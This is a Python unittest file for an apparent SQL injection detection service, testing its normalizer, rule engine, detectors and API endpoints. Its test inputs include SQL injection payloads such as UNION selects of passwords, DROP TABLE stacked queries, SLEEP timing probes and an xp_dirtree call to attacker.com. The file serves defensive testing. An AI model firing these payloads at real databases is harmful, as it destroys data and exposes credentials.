import unittest
import json
from app import create_app
from app.config.settings import Config
from ai.preprocessing.normalizer import PayloadNormalizer
from ai.utils.rule_engine import SQLiRuleEngine
from ai.utils.error_detector import SQLiErrorDetector
from ai.utils.time_detector import SQLiTimeDetector
from ai.utils.oob_detector import SQLiOOBDetector
from ai.utils.second_order import SQLiSecondOrderDetector
from ai.predictors.ensemble import SQLiEnsemblePredictor

class TestAIConfig(Config):
    TESTING = True
    SQLALCHEMY_DATABASE_URI = 'sqlite:///:memory:'
    SECRET_KEY = 'test_secret'
    JWT_SECRET_KEY = 'test_jwt_secret'

class HybridAIEngineTestCase(unittest.TestCase):
    def setUp(self):
        # Create Flask testing client
        self.app = create_app(TestAIConfig)
        self.client = self.app.test_client()
        self.app_context = self.app.app_context()
        self.app_context.push()

    def tearDown(self):
        self.app_context.pop()

    def test_normalizer(self):
        """Tests preprocessing cleaning normalizer on varied encodings."""
        normalizer = PayloadNormalizer()
        
        # URL decode
        self.assertEqual(normalizer.normalize("select%20*%20from%20users"), "select * from users")
        # Whitespace collapsing
        self.assertEqual(normalizer.normalize("select    *    from\nusers"), "select * from users")
        # Unicode decoding
        self.assertEqual(normalizer.normalize("select \\u002a from users"), "select * from users")
        # Hex normalization (0x prefixed hex structure mapping)
        self.assertEqual(normalizer.normalize("select 0x61646d696e"), "select admin")
        
        # Structural Feature extraction
        feats = normalizer.extract_features("1' UNION SELECT null, null --")
        self.assertEqual(feats['sql_keywords'], 2)  # union, select
        self.assertEqual(feats['sql_comments'], 1)   # --
        self.assertGreater(feats['entropy'], 0.0)

    def test_rule_engine(self):
        """Tests signature matching and category classification mapping."""
        engine = SQLiRuleEngine()
        
        # Test UNION SQLi signature
        r1 = engine.evaluate("1' union select null, username from users--")
        self.assertTrue(r1['rule_score'] >= 80.0)
        self.assertEqual(r1['inferred_type'], "UNION SQLi")
        
        # Test Stacked signature
        r2 = engine.evaluate("1; drop table users; --")
        self.assertTrue(r2['rule_score'] >= 80.0)
        self.assertEqual(r2['inferred_type'], "Stacked")

    def test_error_detector(self):
        """Tests parsing database error responses."""
        detector = SQLiErrorDetector()
        
        # SQLite error match
        res_sqlite = detector.analyze_response("sqlite3.operationalerror: near \"select\": syntax error")
        self.assertEqual(res_sqlite['db_detected'], "SQLite")
        self.assertEqual(res_sqlite['error_confidence'], 100.0)
        
        # Postgres error match
        res_pg = detector.analyze_response("psqlexception: syntax error at or near \"union\"")
        self.assertEqual(res_pg['db_detected'], "PostgreSQL")
        self.assertEqual(res_pg['error_confidence'], 100.0)

    def test_time_detector(self):
        """Tests correlating delays with time SQLi signatures."""
        detector = SQLiTimeDetector()
        
        # Delayed request with matching signature
        res_correlate = detector.analyze_request("1' AND SLEEP(5)--", 5.02)
        self.assertTrue(res_correlate['is_time_sqli_likely'])
        self.assertEqual(res_correlate['time_behavior_score'], 100.0)
        
        # Normal delay with signature
        res_fast = detector.analyze_request("1' AND SLEEP(5)--", 0.01)
        self.assertTrue(res_fast['is_time_sqli_likely'])
        self.assertEqual(res_fast['time_behavior_score'], 80.0)

    def test_predict_endpoint_safe(self):
        """Tests POST /api/detection/predict with safe payload."""
        response = self.client.post(
            '/api/detection/predict',
            json={
                'method': 'GET',
                'url': '/search',
                'parameters': {'query': 'python programming book'}
            }
        )
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data['success'])
        
        payload_data = data['data']
        self.assertEqual(payload_data['Attack Type'], 'Safe')
        self.assertFalse(payload_data['Blocked'])
        self.assertLess(payload_data['Confidence'], 35.0)

    def test_predict_endpoint_threats(self):
        """Tests POST /api/detection/predict categorizing varied injection vectors."""
        # Union SQLi
        response = self.client.post(
            '/api/detection/predict',
            json={
                'method': 'GET',
                'url': '/items',
                'parameters': {'id': "1' UNION SELECT null, password FROM users --"}
            }
        )
        data = response.get_json()
        self.assertEqual(data['data']['Attack Type'], 'UNION SQLi')
        self.assertTrue(data['data']['Blocked'])
        
        # Time-Based SQLi
        response = self.client.post(
            '/api/detection/predict',
            json={
                'method': 'POST',
                'url': '/login',
                'body': {'username': "admin' AND SLEEP(5)--"},
                'response_time': 5.15
            }
        )
        data = response.get_json()
        self.assertEqual(data['data']['Attack Type'], 'Time-Based')
        self.assertTrue(data['data']['Blocked'])
        
        # Stacked Queries
        response = self.client.post(
            '/api/detection/predict',
            json={
                'method': 'POST',
                'url': '/settings',
                'body': {'theme': "dark; DROP TABLE users; --"}
            }
        )
        data = response.get_json()
        self.assertEqual(data['data']['Attack Type'], 'Stacked')
        self.assertTrue(data['data']['Blocked'])
        
        # Out-of-Band SQLi
        response = self.client.post(
            '/api/detection/predict',
            json={
                'method': 'GET',
                'url': '/view',
                'parameters': {'id': "1'; EXEC master..xp_dirtree '\\\\attacker.com\\share' --"}
            }
        )
        data = response.get_json()
        self.assertEqual(data['data']['Attack Type'], 'Out-of-Band Suspicion')
        self.assertTrue(data['data']['Blocked'])

    def test_api_health(self):
        """Tests GET /api/detection/health diagnostics page loader."""
        response = self.client.get('/api/detection/health')
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data['success'])
        
        info = data['data']
        self.assertIn('connectivity', info)
        self.assertIn('engine_status', info)
        self.assertIn('agents', info)
        self.assertIn('metrics', info)
        
        self.assertTrue(info['connectivity']['database_connected'])
        self.assertTrue(info['engine_status']['models_loaded'])

    def test_api_train_retrain(self):
        """Tests POST /api/detection/train retraining route."""
        response = self.client.post('/api/detection/train')
        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertTrue(data['success'])
        self.assertIn('selected_model', data['data'])
        self.assertIn('metrics_summary', data['data'])

if __name__ == '__main__':
    unittest.main()

